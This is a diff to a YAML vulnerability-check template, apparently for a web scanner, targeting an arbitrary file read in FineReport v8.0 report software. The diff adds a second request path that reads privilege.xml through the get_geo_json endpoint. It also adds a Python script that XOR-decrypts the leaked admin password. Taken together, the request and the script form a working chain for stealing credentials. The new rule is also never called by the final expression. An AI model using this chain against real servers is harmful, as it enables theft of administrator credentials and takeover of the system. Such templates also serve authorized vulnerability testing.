@@ -7,9 +7,21 @@ info:
   description: |
     FineReport报表软件是一款纯Java编写的，集数据展示(报表)和数据录入(表单)功能于一身的企业级web报表工具。
     FineReport v8.0版本存在任意文件读取漏洞，攻击者可利用漏洞读取网站任意文件
+    使用如下解密脚本可解密得到密码
+    ```
+      cipher = '___0072002a00670066000a' #密文
+      PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23] #掩码
+      Password = ""
+      cipher = cipher[3:] #截断三位后
+      for i in range(int(len(cipher) / 4)):
+          c1 = int("0x" + cipher[i * 4:(i + 1) * 4], 16)
+          c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8]
+          Password = Password + chr(c2)
+      print (Password)
+    ```
     body="isSupportForgetPwd"
   reference:
-    - http://wiki.peiqi.tech/wiki/oa/%E5%B8%86%E8%BD%AFOA/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%20V8%20get_geo_json%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2018-04757.html
+    - https://mp.weixin.qq.com/s/339OfovdxZ98HHBXFnjOFQ
 
 rules:
   r0:
@@ -17,4 +29,9 @@ rules:
       method: GET
       path: /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
     expression: response.status == 200 && response.body.bcontains(b'<![CDATA[admin]]') && response.body.bcontains(b'op=fr_platform]]>') && response.body.bcontains(b'PrivilegeManager')
+  r1:
+    request:
+      method: GET
+      path: /report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
+    expression: response.status == 200 && response.body.bcontains(b'<![CDATA[admin]]') && response.body.bcontains(b'op=fr_platform]]>') && response.body.bcontains(b'PrivilegeManager') 
 expression: r0()
